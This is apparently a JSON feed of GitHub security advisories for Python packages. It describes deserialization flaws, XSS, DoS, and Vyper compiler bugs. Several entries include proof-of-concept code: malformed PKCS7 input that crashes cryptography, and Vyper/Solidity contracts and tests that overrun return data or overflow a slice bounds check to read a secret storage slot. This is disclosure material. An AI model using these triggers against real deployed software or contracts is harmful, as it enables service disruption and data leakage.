{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Calling <code>load_pem_pkcs7_certificates</code> or <code>load_der_pkcs7_certificates</code> could lead to a NULL-pointer dereference and segfault.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Here is a Python code that triggers the issue:</p>\n<pre><code class=\"language-python\">from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates\n\npem_p7 = b\"\"\"\n-----BEGIN PKCS7-----\nMAsGCSqGSIb3DQEHAg==\n-----END PKCS7-----\n\"\"\"\n\nder_p7 = b\"\\x30\\x0B\\x06\\x09\\x2A\\x86\\x48\\x86\\xF7\\x0D\\x01\\x07\\x02\"\n\nload_pem_pkcs7_certificates(pem_p7)\nload_der_pkcs7_certificates(der_p7)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97\">https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a\">https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49083\">https://nvd.nist.gov/vuln/detail/CVE-2023-49083</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/pull/9926\">https://github.com/pyca/cryptography/pull/9926</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/11/29/2\">http://www.openwall.com/lists/oss-security/2023/11/29/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jfhm-5ghh-2f97\">https://github.com/advisories/GHSA-jfhm-5ghh-2f97</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jfhm-5ghh-2f97",
            "title": "[cryptography] cryptography vulnerable to NULL-dereference when loading PKCS7 certificates",
            "date_modified": "2024-02-02T21:59:01.000Z",
            "date_published": "2023-11-28T20:46:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jfhm-5ghh-2f97"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, which was classified as critical, has been found in van_der_Schaar LAB synthcity 0.2.9. Affected by this issue is the function load_from_file of the component PKL File Handler. The manipulation leads to deserialization. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-252182 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early and confirmed immediately the existence of the issue. A patch is planned to be released in February 2024.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0937\">https://nvd.nist.gov/vuln/detail/CVE-2024-0937</a></li>\n<li><a href=\"https://github.com/bayuncao/vul-cve-6\">https://github.com/bayuncao/vul-cve-6</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.252182\">https://vuldb.com/?ctiid.252182</a></li>\n<li><a href=\"https://vuldb.com/?id.252182\">https://vuldb.com/?id.252182</a></li>\n<li><a href=\"https://github.com/vanderschaarlab/synthcity/blob/73cfd8ca784f70141fc7f2969221cd3b5737f7b1/src/synthcity/utils/serialization.py#L30\">https://github.com/vanderschaarlab/synthcity/blob/73cfd8ca784f70141fc7f2969221cd3b5737f7b1/src/synthcity/utils/serialization.py#L30</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4957-7vhp-7v59\">https://github.com/advisories/GHSA-4957-7vhp-7v59</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4957-7vhp-7v59",
            "title": "[synthcity] Deserialization of untrusted data in synthcity",
            "date_modified": "2024-02-02T20:31:48.000Z",
            "date_published": "2024-01-26T18:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4957-7vhp-7v59"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package dash-core-components before 2.13.0; all versions of the package dash-core-components; versions of the package dash before 2.15.0; all versions of the package dash-html-components; versions of the package dash-html-components before 2.0.16 are vulnerable to Cross-site Scripting (XSS) when the href of the a tag is controlled by an adversary. An authenticated attacker who stores a view that exploits this vulnerability could steal the data that's visible to another user who opens that view - not just the data already included on the page, but they could also, in theory, make additional requests and access other data accessible to this user. In some cases, they could also steal the access tokens of that user, which would allow the attacker to act as that user, including viewing other apps and resources hosted on the same server.</p>\n<p><strong>Note:</strong></p>\n<p>This is only exploitable in Dash apps that include some mechanism to store user input to be reloaded by a different user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21485\">https://nvd.nist.gov/vuln/detail/CVE-2024-21485</a></li>\n<li><a href=\"https://github.com/plotly/dash/issues/2729\">https://github.com/plotly/dash/issues/2729</a></li>\n<li><a href=\"https://github.com/plotly/dash/pull/2732\">https://github.com/plotly/dash/pull/2732</a></li>\n<li><a href=\"https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c\">https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c</a></li>\n<li><a href=\"https://github.com/plotly/dash/releases/tag/v2.15.0\">https://github.com/plotly/dash/releases/tag/v2.15.0</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084\">https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337\">https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335\">https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-547x-748v-vp6p\">https://github.com/advisories/GHSA-547x-748v-vp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-547x-748v-vp6p",
            "title": "[dash] Dash apps vulnerable to Cross-site Scripting",
            "date_modified": "2024-02-02T18:10:52.000Z",
            "date_published": "2024-02-02T06:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-547x-748v-vp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package dash-core-components before 2.13.0; all versions of the package dash-core-components; versions of the package dash before 2.15.0; all versions of the package dash-html-components; versions of the package dash-html-components before 2.0.16 are vulnerable to Cross-site Scripting (XSS) when the href of the a tag is controlled by an adversary. An authenticated attacker who stores a view that exploits this vulnerability could steal the data that's visible to another user who opens that view - not just the data already included on the page, but they could also, in theory, make additional requests and access other data accessible to this user. In some cases, they could also steal the access tokens of that user, which would allow the attacker to act as that user, including viewing other apps and resources hosted on the same server.</p>\n<p><strong>Note:</strong></p>\n<p>This is only exploitable in Dash apps that include some mechanism to store user input to be reloaded by a different user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21485\">https://nvd.nist.gov/vuln/detail/CVE-2024-21485</a></li>\n<li><a href=\"https://github.com/plotly/dash/issues/2729\">https://github.com/plotly/dash/issues/2729</a></li>\n<li><a href=\"https://github.com/plotly/dash/pull/2732\">https://github.com/plotly/dash/pull/2732</a></li>\n<li><a href=\"https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c\">https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c</a></li>\n<li><a href=\"https://github.com/plotly/dash/releases/tag/v2.15.0\">https://github.com/plotly/dash/releases/tag/v2.15.0</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084\">https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337\">https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335\">https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-547x-748v-vp6p\">https://github.com/advisories/GHSA-547x-748v-vp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-547x-748v-vp6p",
            "title": "[dash-core-components] Dash apps vulnerable to Cross-site Scripting",
            "date_modified": "2024-02-02T18:10:52.000Z",
            "date_published": "2024-02-02T06:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-547x-748v-vp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package dash-core-components before 2.13.0; all versions of the package dash-core-components; versions of the package dash before 2.15.0; all versions of the package dash-html-components; versions of the package dash-html-components before 2.0.16 are vulnerable to Cross-site Scripting (XSS) when the href of the a tag is controlled by an adversary. An authenticated attacker who stores a view that exploits this vulnerability could steal the data that's visible to another user who opens that view - not just the data already included on the page, but they could also, in theory, make additional requests and access other data accessible to this user. In some cases, they could also steal the access tokens of that user, which would allow the attacker to act as that user, including viewing other apps and resources hosted on the same server.</p>\n<p><strong>Note:</strong></p>\n<p>This is only exploitable in Dash apps that include some mechanism to store user input to be reloaded by a different user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21485\">https://nvd.nist.gov/vuln/detail/CVE-2024-21485</a></li>\n<li><a href=\"https://github.com/plotly/dash/issues/2729\">https://github.com/plotly/dash/issues/2729</a></li>\n<li><a href=\"https://github.com/plotly/dash/pull/2732\">https://github.com/plotly/dash/pull/2732</a></li>\n<li><a href=\"https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c\">https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c</a></li>\n<li><a href=\"https://github.com/plotly/dash/releases/tag/v2.15.0\">https://github.com/plotly/dash/releases/tag/v2.15.0</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084\">https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337\">https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335\">https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336\">https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-547x-748v-vp6p\">https://github.com/advisories/GHSA-547x-748v-vp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-547x-748v-vp6p",
            "title": "[dash-html-components] Dash apps vulnerable to Cross-site Scripting",
            "date_modified": "2024-02-02T18:10:52.000Z",
            "date_published": "2024-02-02T06:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-547x-748v-vp6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was found in flink-extended ai-flow 0.3.1. It has been declared as critical. Affected by this vulnerability is the function cloudpickle.loads of the file <code>\\ai_flow\\cli\\commands\\workflow_command.py</code>. The manipulation leads to deserialization. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The identifier VDB-252205 was assigned to this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0960\">https://nvd.nist.gov/vuln/detail/CVE-2024-0960</a></li>\n<li><a href=\"https://github.com/bayuncao/vul-cve-8\">https://github.com/bayuncao/vul-cve-8</a></li>\n<li><a href=\"https://github.com/bayuncao/vul-cve-8/blob/main/dataset.pkl\">https://github.com/bayuncao/vul-cve-8/blob/main/dataset.pkl</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.252205\">https://vuldb.com/?ctiid.252205</a></li>\n<li><a href=\"https://vuldb.com/?id.252205\">https://vuldb.com/?id.252205</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mgg-3rq2-hff4\">https://github.com/advisories/GHSA-7mgg-3rq2-hff4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mgg-3rq2-hff4",
            "title": "[ai-flow] ai-flow Deserialization of Untrusted Data vulnerability",
            "date_modified": "2024-02-02T18:10:23.000Z",
            "date_published": "2024-01-27T12:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mgg-3rq2-hff4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>When calls to external contracts are made, we write the input buffer starting at byte 28, and allocate the return buffer to start at byte 0 (overlapping with the input buffer). When checking <code>RETURNDATASIZE</code> for dynamic types, the size is compared only to the minimum allowed size for that type, and not to the returned value's <code>length</code>. As a result, malformed return data can cause the contract to mistake data from the input buffer for returndata.</p>\n<p>This advisory is given a severity of \"Low\" because when the called contract returns invalid ABIv2 encoded data, the calling contract can read different invalid data (from the dirty buffer) than the called contract returned.</p>\n<h2 id=\"details\">Details</h2>\n<p>When arguments are packed for an external call, we create a buffer of size <code>max(args, return_data) + 32</code>. The input buffer is placed in this buffer (starting at byte 28), and the return buffer is allocated to start at byte 0. The assumption is that we can reuse the memory becase we will not be able to read past <code>RETURNDATASIZE</code>.</p>\n<pre><code class=\"language-python\">if fn_type.return_type is not None:\n    return_abi_t = calculate_type_for_external_return(fn_type.return_type).abi_type\n\n    # we use the same buffer for args and returndata,\n    # so allocate enough space here for the returndata too.\n    buflen = max(args_abi_t.size_bound(), return_abi_t.size_bound())\nelse:\n    buflen = args_abi_t.size_bound()\n\nbuflen += 32  # padding for the method id\n</code></pre>\n<p>When data is returned, we unpack the return data by starting at byte 0. We check that <code>RETURNDATASIZE</code> is greater than the minimum allowed for the returned type:</p>\n<pre><code class=\"language-python\">if not call_kwargs.skip_contract_check:\n    assertion = IRnode.from_list(\n        [\"assert\", [\"ge\", \"returndatasize\", min_return_size]],\n        error_msg=\"returndatasize too small\",\n    )\n    unpacker.append(assertion)\n</code></pre>\n<p>This check ensures that any dynamic types returned will have a size of at least 64. However, it does not verify that <code>RETURNDATASIZE</code> is as large as the <code>length</code> word of the dynamic type. </p>\n<p>As a result, if a contract expects a dynamic type to be returned, and the part of the return data that is read as <code>length</code> includes a size that is larger than the actual <code>RETURNDATASIZE</code>, the return data read from the buffer will overrun the actual return data size and read from the input buffer.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>This contract calls an external contract with two arguments. As the call is made, the buffer includes:</p>\n<ul>\n<li>byte 28: method_id</li>\n<li>byte 32: first argument (0)</li>\n<li>byte 64: second argument (hash)</li>\n</ul>\n<p>The return data buffer begins at byte 0, and will return the returned bytestring, up to a maximum length of 96 bytes.</p>\n<pre><code class=\"language-python\">interface Zero:\n    def sneaky(a: uint256, b: bytes32) -&gt; Bytes[96]: view\n\n@external\ndef test_sneaky(z: address) -&gt; Bytes[96]:\n    return Zero(z).sneaky(0, keccak256(\"oops\"))\n</code></pre>\n<p>On the other side, imagine a simple contract that does not, in fact, return a bytestring, but instead returns two uint256s. I've implemented it in Solidity for ease of use with Foundry:</p>\n<pre><code class=\"language-solidity\">function sneaky(uint a, bytes32 b) external pure returns (uint, uint) {\n    return (32, 32);\n}\n</code></pre>\n<p>The return data will be parsed as a bytestring. The first 32 will point us to byte 32 to read the length. The second 32 will be perceived as the length. It will then read the next 32 bytes from the return data buffer, even though those weren't a part of the return data.</p>\n<p>Since these bytes will come from byte 64, we can see above that the hash was placed there in the input buffer.</p>\n<p>If we run the following Foundry test, we can see that this does in fact happen:</p>\n<pre><code class=\"language-solidity\">function test__sneakyZeroReturn() public {\n    ZeroReturn z = new ZeroReturn();\n    c = SuperContract(deployer.deploy(\"src/loose/\", \"ret_overflow\", \"\"));\n    console.logBytes(c.test_sneaky(address(z)));\n}\n</code></pre>\n<pre><code class=\"language-md\">Logs:\n  0xd54c03ccbc84dd6002c98c6df5a828e42272fc54b512ca20694392ca89c4d2c6\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<p>Malicious or mistaken contracts returning the malformed data can result in overrunning the returned data and reading return data from the input buffer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686\">https://github.com/vyperlang/vyper/security/advisories/GHSA-gp3w-2v2m-p686</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24560\">https://nvd.nist.gov/vuln/detail/CVE-2024-24560</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gp3w-2v2m-p686\">https://github.com/advisories/GHSA-gp3w-2v2m-p686</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gp3w-2v2m-p686",
            "title": "[vyper] Vyper's external calls can overflow return data to return input buffer",
            "date_modified": "2024-02-02T19:44:17.000Z",
            "date_published": "2024-02-02T18:10:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gp3w-2v2m-p686"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in LIEF through 0.11.0. A heap-buffer-overflow exists in the function main located in <code>pe_reader.c</code>. It allows an attacker to cause code Execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-32297\">https://nvd.nist.gov/vuln/detail/CVE-2021-32297</a></li>\n<li><a href=\"https://github.com/lief-project/LIEF/issues/449\">https://github.com/lief-project/LIEF/issues/449</a></li>\n<li><a href=\"https://github.com/lief-project/LIEF/commit/19e06755e8ce1ecf136360a5c36cded3701ac253\">https://github.com/lief-project/LIEF/commit/19e06755e8ce1ecf136360a5c36cded3701ac253</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22x7-vwh9-5w4g\">https://github.com/advisories/GHSA-22x7-vwh9-5w4g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22x7-vwh9-5w4g",
            "title": "[lief] LIEF heap-buffer-overflow",
            "date_modified": "2024-02-01T21:22:04.000Z",
            "date_published": "2022-05-24T19:15:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22x7-vwh9-5w4g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>svm_predict_values in svm.cpp in Libsvm v324, as used in scikit-learn 0.23.2 and other products, allows attackers to cause a denial of service (segmentation fault) via a crafted model SVM (introduced via pickle, json, or any other model permanence standard) with a large value in the _n_support array.\nNOTE: the scikit-learn vendor's position is that the behavior can only occur if the library's API is violated by an application that changes a private attribute.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-28975\">https://nvd.nist.gov/vuln/detail/CVE-2020-28975</a></li>\n<li><a href=\"https://github.com/scikit-learn/scikit-learn/issues/18891\">https://github.com/scikit-learn/scikit-learn/issues/18891</a></li>\n<li><a href=\"https://github.com/cjlin1/libsvm/blob/9a3a9708926dec87d382c43b203f2ca19c2d56a0/svm.cpp#L2501\">https://github.com/cjlin1/libsvm/blob/9a3a9708926dec87d382c43b203f2ca19c2d56a0/svm.cpp#L2501</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/160281/SciKit-Learn-0.23.2-Denial-Of-Service.html\">http://packetstormsecurity.com/files/160281/SciKit-Learn-0.23.2-Denial-Of-Service.html</a></li>\n<li><a href=\"http://seclists.org/fulldisclosure/2020/Nov/44\">http://seclists.org/fulldisclosure/2020/Nov/44</a></li>\n<li><a href=\"https://github.com/scikit-learn/scikit-learn/commit/1bf13d567d3cd74854aa8343fd25b61dd768bb85\">https://github.com/scikit-learn/scikit-learn/commit/1bf13d567d3cd74854aa8343fd25b61dd768bb85</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202301-03\">https://security.gentoo.org/glsa/202301-03</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jxfp-4rvq-9h9m\">https://github.com/advisories/GHSA-jxfp-4rvq-9h9m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jxfp-4rvq-9h9m",
            "title": "[scikit-learn] scikit-learn Denial of Service",
            "date_modified": "2024-02-01T20:59:17.000Z",
            "date_published": "2022-05-24T17:34:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jxfp-4rvq-9h9m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>jsonpickle through 1.4.1 allows remote code execution during deserialization of a malicious payload through the <code>decode()</code> function. This CVE is disputed by the project author as intended functionality.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-22083\">https://nvd.nist.gov/vuln/detail/CVE-2020-22083</a></li>\n<li><a href=\"https://github.com/jsonpickle/jsonpickle/issues/332\">https://github.com/jsonpickle/jsonpickle/issues/332</a></li>\n<li><a href=\"https://github.com/jsonpickle/jsonpickle/issues/332#issuecomment-747807494\">https://github.com/jsonpickle/jsonpickle/issues/332#issuecomment-747807494</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2020-22083\">https://access.redhat.com/security/cve/CVE-2020-22083</a></li>\n<li><a href=\"https://gist.github.com/j0lt-github/bb543e77a1a10c33cb56cf23d0837874\">https://gist.github.com/j0lt-github/bb543e77a1a10c33cb56cf23d0837874</a></li>\n<li><a href=\"https://github.com/j0lt-github/python-deserialization-attack-payload-generator\">https://github.com/j0lt-github/python-deserialization-attack-payload-generator</a></li>\n<li><a href=\"https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/\">https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/</a></li>\n<li><a href=\"https://github.com/jsonpickle/jsonpickle/issues/335\">https://github.com/jsonpickle/jsonpickle/issues/335</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j66q-qmrc-89rx\">https://github.com/advisories/GHSA-j66q-qmrc-89rx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j66q-qmrc-89rx",
            "title": "[jsonpickle] jsonpickle unsafe deserialization",
            "date_modified": "2024-02-01T20:58:41.000Z",
            "date_published": "2022-05-24T17:36:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j66q-qmrc-89rx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Tornado before 3.2.2 sends arbitrary responses that contain a fixed CSRF token and may be sent with HTTP compression, which makes it easier for remote attackers to conduct a BREACH attack and determine this token via a series of crafted requests.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-9720\">https://nvd.nist.gov/vuln/detail/CVE-2014-9720</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308\">https://github.com/tornadoweb/tornado/commit/1c36307463b1e8affae100bf9386948e6c1b2308</a></li>\n<li><a href=\"https://bugzilla.novell.com/show_bug.cgi?id=930362\">https://bugzilla.novell.com/show_bug.cgi?id=930362</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1222816\">https://bugzilla.redhat.com/show_bug.cgi?id=1222816</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2015/05/19/4\">http://openwall.com/lists/oss-security/2015/05/19/4</a></li>\n<li><a href=\"http://www.tornadoweb.org/en/stable/releases/v3.2.2.html\">http://www.tornadoweb.org/en/stable/releases/v3.2.2.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vpw-mgpf-mpvv\">https://github.com/advisories/GHSA-8vpw-mgpf-mpvv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vpw-mgpf-mpvv",
            "title": "[tornado] Tornado XSRF cookie allows side-channel attack against TLS (BREACH attack)",
            "date_modified": "2024-02-01T20:53:46.000Z",
            "date_published": "2022-05-17T19:57:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vpw-mgpf-mpvv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p><a href=\"https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457\">The bounds check for slices</a> does not account for the ability for <code>start + length</code> to overflow when the values aren't literals. </p>\n<p>If a <code>slice()</code> function uses a non-literal argument for the <code>start</code>  or <code>length</code> variable, this creates the ability for an attacker to overflow the bounds check. </p>\n<p>This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the <code>length</code> slot of the respective array.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production.</p>\n<p>tracking in issue <a href=\"https://github.com/vyperlang/vyper/issues/3756\">https://github.com/vyperlang/vyper/issues/3756</a>.</p>\n<h2 id=\"details\">Details</h2>\n<p>Here the flow for <code>storage</code> is supposed, but it is generalizable also for the other locations.</p>\n<p>When calling <code>slice()</code> on a storage value, there are compile time bounds checks if the <code>start</code> and <code>length</code> values are literals, but of course this cannot happen if they are passed values:</p>\n<pre><code class=\"language-python\">if not is_adhoc_slice:\n    if length_literal is not None:\n        if length_literal &lt; 1:\n            raise ArgumentException(\"Length cannot be less than 1\", length_expr)\n\n        if length_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", length_expr)\n\n    if start_literal is not None:\n        if start_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", start_expr)\n        if length_literal is not None and start_literal + length_literal &gt; arg_type.length:\n            raise ArgumentException(f\"slice out of bounds for {arg_type}\", node)\n</code></pre>\n<p>At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:</p>\n<pre><code class=\"language-python\">[\"assert\", [\"le\", [\"add\", start, length], src_len]],  # bounds check\n</code></pre>\n<p>The storage <code>slice()</code> function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the <code>start</code>  or <code>length</code> value, they can force an overflow and access an unrelated storage slot.</p>\n<p>In most cases, this will mean they have the ability to forcibly return <code>0</code> for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.</p>\n<h2 id=\"poc-oob-access\">POC: OOB access</h2>\n<p>For simplicity, take the following Vyper contract, which takes an argument to determine where in a <code>Bytes[64]</code> bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.</p>\n<pre><code class=\"language-python\"># @version ^0.3.9\n\nx: public(Bytes[64])\nsecret: uint256\n\n@external\ndef __init__():\n    self.x = empty(Bytes[64])\n    self.secret = 42\n\n@external\ndef slice_it(start: uint256) -&gt; Bytes[64]:\n    return slice(self.x, start, 64)\n</code></pre>\n<p>We can use the following manual storage to demonstrate the vulnerability:</p>\n<pre><code class=\"language-json\">{\"x\": {\"type\": \"bytes32\", \"slot\": 0}, \"secret\": {\"type\": \"uint256\", \"slot\": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}\n</code></pre>\n<p>If we run the following test, passing <code>max - 63</code> as the <code>start</code> value, we will overflow the bounds check, but access the storage slot at <code>1 + (2**256 - 63) / 32</code>, which is what was set in the above storage layout:</p>\n<pre><code class=\"language-solidity\">function test__slice_error() public {\n    c = SuperContract(deployer.deploy_with_custom_storage(\"src/loose/\", \"slice_error\", \"slice_error_storage\"));\n    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63\n    console.logBytes(result);\n}\n</code></pre>\n<p>The result is that we return the secret value from 